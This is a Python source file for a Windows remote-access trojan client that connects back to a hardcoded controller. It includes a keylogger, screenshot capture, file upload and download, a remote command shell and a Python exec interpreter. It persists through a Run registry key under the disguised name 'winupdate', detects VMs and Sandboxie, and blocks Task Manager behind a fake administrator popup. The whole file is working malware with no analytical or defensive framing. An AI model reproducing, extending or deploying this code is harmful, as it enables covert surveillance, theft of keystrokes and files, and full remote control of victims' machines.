import socket, os, sys, platform, time, ctypes, subprocess, pyscreeze, threading, pynput.keyboard, wmi, json, enum, requests, win32api, winerror, win32event, getpass
from shutil import copyfile
from winreg import *
from io import StringIO, BytesIO
from cryptography.fernet import Fernet


strHost = "10.5.148.3"
intPort = 3000

strPath = os.path.realpath(sys.argv[0])  # get file path
TMP = os.environ["TEMP"]  # get temp path
APPDATA = os.environ["APPDATA"]
intBuff = 1024
runFirst = True

blnMeltFile = False
blnAddToStartup = False

class SW(enum.IntEnum):
    
    HIDE = 0
    MAXIMIZE = 3
    MINIMIZE = 6
    RESTORE = 9
    SHOW = 5
    SHOWDEFAULT = 10
    SHOWMAXIMIZED = 3
    SHOWMINIMIZED = 2
    SHOWMINNOACTIVE = 7
    SHOWNA = 8
    SHOWNOACTIVATE = 4
    SHOWNORMAL = 1


class ERROR(enum.IntEnum):

    ZERO = 0
    FILE_NOT_FOUND = 2
    PATH_NOT_FOUND = 3
    BAD_FORMAT = 11
    ACCESS_DENIED = 5
    ASSOC_INCOMPLETE = 27
    DDE_BUSY = 30
    DDE_FAIL = 29
    DDE_TIMEOUT = 28
    DLL_NOT_FOUND = 32
    NO_ASSOC = 31
    OOM = 8
    SHARE = 26


# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)


# function to move file to tmp dir and relaunch
def meltFile():
    winupdate = os.path.join(TMP, "winupdate")
    # ignore if the path is in appdata as well
    if not (os.getcwd() == winupdate) and not (os.getcwd() == APPDATA):
        # if folder already exists
        try:
            os.mkdir(winupdate)
        except:
            pass
        strNewFile = os.path.join(winupdate, os.path.basename(sys.argv[0]))

        strCommand = f"timeout 2 & move /y {os.path.realpath(sys.argv[0])} {strNewFile} & cd /d {winupdate}\\ & {strNewFile}"
        subprocess.Popen(strCommand, shell=True)
        sys.exit(0)


def detectSandboxie():
    try:
        ctypes.windll.LoadLibrary("SbieDll.dll")
    except Exception:
        return False
    return True


def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
        if (
            "vbox" in objDiskDrive.Caption.lower()
            or "virtual" in objDiskDrive.Caption.lower()
        ):
            return True
    return False


def startup(onstartup):
    try:
        strAppPath = os.path.join(APPDATA, os.path.basename(strPath))
        if not os.getcwd() == APPDATA:
            copyfile(strPath, strAppPath)

        objRegKey = OpenKey(
            HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            KEY_ALL_ACCESS,
        )
        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath)
        CloseKey(objRegKey)
    except WindowsError:
        if not onstartup:
            send(b"Unable to add to startup!")
    else:
        if not onstartup:
            send(b"success")


def remove_from_startup():
    try:
        objRegKey = OpenKey(
            HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            KEY_ALL_ACCESS,
        )
        DeleteValue(objRegKey, "winupdate")
        CloseKey(objRegKey)
    except FileNotFoundError:
        send(b"Program is not registered in startup.")
    except WindowsError:
        send(b"Error removing value!")
    else:
        send(b"success")


def server_connect():
    try:
        global objSocket, objEncryptor
        while True:  # infinite loop until socket can connect
            try:
                objSocket = socket.socket()
                objSocket.connect((strHost, intPort))
            except socket.error:
                time.sleep(5)  # wait 5 seconds to try again
            else:
                break

        arrUserInfo = [socket.gethostname()]
        strPlatform = f"{platform.system()} {platform.release()}"
        if detectSandboxie():
            strPlatform += " (Sandboxie) "
        if detectVM():
            strPlatform += " (Virtual Machine) "
        arrUserInfo.extend([strPlatform, os.environ["USERNAME"]])

        objSocket.send(json.dumps(arrUserInfo).encode())

        objEncryptor = Fernet(objSocket.recv(intBuff))
    except Exception:
        pass

# function to receive data
try:
    recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))
except Exception:
    pass

# function to send data
try:
    send = lambda data: objSocket.send(objEncryptor.encrypt(data))
except Exception:
    pass

if blnMeltFile:
    meltFile()
if blnAddToStartup:
    startup(True)

server_connect()


def OnKeyboardEvent(event):
    global strKeyLogs

    try:  # check to see if variable is defined
        strKeyLogs
    except NameError:
        strKeyLogs = ""

    if event == Key.backspace:
        strKeyLogs += " [Bck] "
    elif event == Key.tab:
        strKeyLogs += " [Tab] "
    elif event == Key.enter:
        strKeyLogs += "\n"
    elif event == Key.space:
        strKeyLogs += " "
    elif type(event) == Key:  # if the character is some other type of special key
        strKeyLogs += f" [{str(event)[4:]}] "
    else:
        strKeyLogs += f"{event}"[1 : len(str(event)) - 1]


KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
Key = pynput.keyboard.Key


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""
    while len(bytData) < buffer:
        bytData += objSocket.recv(buffer)
    return objEncryptor.decrypt(bytData)


def sendall(data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(str(intDataSize).encode())
    time.sleep(0.2)
    objSocket.send(bytEncryptedData)


# vbs message box
def MessageBox(message):
    try:
        strScript = os.path.join(TMP, "m.vbs")
        with open(strScript, "w") as objVBS:
            objVBS.write(
                f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"'
            )
        subprocess.Popen(
            ["cscript", strScript],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            shell=True,
        )
    except Exception:
        send(b"Error desplaying message")


def screenshot():
    try:
        # Take Screenshot
        objImage = pyscreeze.screenshot()
        # Create BytesIO Object as objBytes
        with BytesIO() as objBytes:
            # Save Screenshot into BytesIO Object
            objImage.save(objBytes, format="PNG")
            # Get BytesIO Object Data as bytes
            objPic = objBytes.getvalue()

        sendall(objPic)
    except Exception:
        send(b"Error taking screenshot")


def file_browser():
    try:
        arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
        arrRawDrives = arrRawDrives.split("\000")[:-1]

        strDrives = ""
        for drive in arrRawDrives:  # get proper view and place array into string
            strDrives += drive.replace("\\", "") + "\n"
        send(strDrives.encode())

        strDir = recv(intBuff).decode()

        if os.path.isdir(strDir):
            if strDir[:-1] != "\\" or strDir[:-1] != "/":
                strDir += "\\"
            arrFiles = os.listdir(strDir)

            strFiles = ""
            for file in arrFiles:
                strFiles += f"{file}\n"

            sendall(strFiles.encode())

        else:  # if the user entered an invalid directory
            send(b"Invalid Directory!")
            return
    except Exception:
        send(b"Error while trying to browse the directory")


def upload(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer)
    strOutputFile = recv(intBuff).decode()

    try:
        with open(strOutputFile, "wb") as objFile:
            objFile.write(file_data)
        send(b"Done!")
    except:
        send(b"Path is protected/invalid!")


def receive(data):
    if not os.path.isfile(data):
        send(b"Target file not found!")
        return

    with open(data, "rb") as objFile:
        sendall(objFile.read())  # Send Contents of File


def lock():
    try:
        ctypes.windll.user32.LockWorkStation()  # lock pc
    except Exception:
        send(b"unable to execute command")


def shutdown(shutdowntype):
    try:
        command = f"shutdown {shutdowntype} -f -t 30"
        subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            shell=True,
        )
        objSocket.close()  # close connection and exit
        sys.exit(0)
    except Exception:
        send(b"unable to execute command")

def executeSetWallpaper(url):
    try:
        path = os.path.join(TMP, 'wallpaper.jpg')
        path_file = "C:/Users/{0}/AppData/Roaming/Microsoft/Windows/Themes/TranscodedWallpaper".format(getpass.getuser())

        image = requests.get(url)
        with open(path_file, 'wb') as f:
            f.write(image.content)

        with open(path, 'wb') as f:
            f.write(image.content)

        os.system('reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "{0}" /f'.format(path))
        os.system('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')
    except Exception:
        pass

def setWallpaper(url):
    if ctypes.windll.shell32.IsUserAnAdmin():
        executeSetWallpaper(url)
    else:
        hinstance = ctypes.windll.shell32.ShellExecuteW(
            None, 'runas', sys.executable, sys.argv[0], None, SW.SHOWNORMAL
        )
        if hinstance <= 32:
            raise RuntimeError(ERROR(hinstance))
        executeSetWallpaper(url)


def command_shell():
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            strCurrentDir = os.getcwd()
            send(os.getcwdb())
            bytData = b""

            while True:
                strData = recv(intBuff).decode()

                if strData == "goback":
                    os.chdir(strCurrentDir)  # change directory back to original
                    break

                elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
                    objCommand = subprocess.Popen(
                        strData + " & cd",
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        shell=True,
                    )
                    if objCommand.stderr.read().decode() == "":  # if there is no error
                        strOutput = (
                            (objCommand.stdout.read()).decode().splitlines()[0]
                        )  # decode and remove new line
                        os.chdir(strOutput)  # change directory

                        bytData = f"\n{os.getcwd()}>".encode()  # output to send the server

                elif len(strData) > 0:
                    objCommand = subprocess.Popen(
                        strData,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        shell=True,
                    )
                    strOutput = (
                        objCommand.stdout.read() + objCommand.stderr.read()
                    )  # since cmd uses bytes, decode it
                    bytData = strOutput + b"\n" + os.getcwdb() + b">"
                else:
                    bytData = b"Error!"

                sendall(bytData)  # send output
        except Exception:
            send(b"unable to execute command")
        else:
            hinstance = ctypes.windll.shell32.ShellExecuteW(
                None, 'runas', sys.executable, sys.argv[0], None, SW.SHOWNORMAL
            )
            if hinstance <= 32:
                raise RuntimeError(ERROR(hinstance))


def python_interpreter():
    try:
        send(b"received")
        while True:
            strCommand = recv(intBuff).decode()
            if strCommand == "exit":
                send(b"exiting")
                break
            old_stdout = sys.stdout
            redirected_output = sys.stdout = StringIO()
            try:
                exec(strCommand)
                print()
                strError = None
            except Exception as e:
                strError = f"{e.__class__.__name__}: "
                try:
                    strError += f"{e.args[0]}"
                except:
                    pass
            finally:
                sys.stdout = old_stdout

            if strError:
                sendall(strError.encode())
            else:
                sendall(redirected_output.getvalue().encode())
    except Exception:
        send(b"unable to execute command")


def vbs_block_process(process, popup=False):
    # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source
    # popup: list
    # [message, title, timeout, type]

    strVBSCode = (
        "On Error Resume Next\n"
        + 'Set objWshShl = WScript.CreateObject("WScript.Shell")\n'
        + 'Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!//./root/cimv2")\n'
        + 'Set colMonitoredProcesses = objWMIService.ExecNotificationQuery("select * '
        'from __instancecreationevent " & " within 1 where TargetInstance isa \'Win32_Process\'")\n'
        + "Do"
        + "\n"
        + "Set objLatestProcess = colMonitoredProcesses.NextEvent\n"
        + f'If LCase(objLatestProcess.TargetInstance.Name) = "{process}" Then\n'
        + "objLatestProcess.TargetInstance.Terminate\n"
    )
    if popup:  # if showing a message
        strVBSCode += (
            f'objWshShl.Popup "{popup[0]}", {popup[2]}, "{popup[1]}", {popup[3]}\n'
        )

    strVBSCode += "End If\nLoop"

    strScript = os.path.join(TMP, "d.vbs")

    with open(strScript, "w") as objVBSFile:
        objVBSFile.write(strVBSCode)

    subprocess.Popen(
        ["cscript", strScript],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE,
        shell=True,
    )  # run the script


def disable_taskmgr():
    try:
        global blnDisabled
        if not blnDisabled:  # if task manager is already disabled, enable it
            send(b"Enabling ...")

            subprocess.Popen(
                ["taskkill", "/f", "/im", "cscript.exe"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                shell=True,
            )

            blnDisabled = True
        else:
            send(b"Disabling ...")

            popup = [
                "Task Manager has been disabled by your administrator",
                "Task Manager",
                "3",
                "16",
            ]

            vbs_block_process("taskmgr.exe", popup=popup)
            blnDisabled = False
    except Exception:
        send(b"unable to disable task manager")


def keylogger(option):
    global strKeyLogs

    if option == "start":
        if not KeyListener.running:
            KeyListener.start()
            send(b"success")
        else:
            send(b"error")

    elif option == "stop":
        if KeyListener.running:
            KeyListener.stop()
            threading.Thread.__init__(KeyListener)  # re-initialise the thread
            strKeyLogs = ""
            send(b"success")
        else:
            send(b"error")

    elif option == "dump":
        if not KeyListener.running:
            send(b"error")
        else:
            if strKeyLogs == "":
                send(b"error2")
            else:
                time.sleep(0.2)
                sendall(strKeyLogs.encode())
                strKeyLogs = ""  # clear logs


def run_command(command):
    try:
        bytLogOutput = b"\n"

        if len(command) > 0:
            objCommand = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                shell=True,
            )
            bytLogOutput += objCommand.stdout.read() + objCommand.stderr.read()
        else:
            bytLogOutput += b"Error!"

        sendall(bytLogOutput)
    except Exception:
        send(b"unable to execute command")

while True:
    try:
        while True:
            strData = recv(intBuff)
            strData = strData.decode()

            if strData == "exit":
                objSocket.close()
                # sys.exit(0)
                break
            elif runFirst == True:
                if not "blnDisabled" in globals():  # if the variable doesnt exist yet
                    blnDisabled = True
                try:
                    disable_taskmgr()
                except Exception:
                    print("unable to disable taskmanager")

                runFirst = False
            elif strData[:3] == "msg":
                MessageBox(strData[3:])
            elif strData == "startup":
                startup(False)
            elif strData == "rmvstartup":
                remove_from_startup()
            elif strData == "screen":
                screenshot()
            elif strData == "filebrowser":
                file_browser()
            elif strData[:4] == "send":
                upload(strData[4:])
            elif strData[:4] == "recv":
                receive(strData[4:])
            elif strData == "lock":
                lock()
            elif strData == "shutdown":
                shutdown("-s")
            elif strData == "restart":
                shutdown("-r")
            elif strData == "test":
                continue
            elif strData[:9] == "wallpaper":
                print(strData[9:])
                setWallpaper(strData[9:])
            elif strData == "cmd":
                command_shell()
            elif strData == "python":
                python_interpreter()
            elif strData == "keystart":
                keylogger("start")
            elif strData == "keystop":
                keylogger("stop")
            elif strData == "keydump":
                keylogger("dump")
            elif strData[:6] == "runcmd":
                run_command(strData[6:])
            elif strData == "dtaskmgr":
                if not "blnDisabled" in globals():  # if the variable doesnt exist yet
                    blnDisabled = True
                disable_taskmgr()
    except socket.error:  # if the server closes without warning
        objSocket.close()
        del objSocket
    except Exception:
        pass
    finally:
        server_connect()

# eof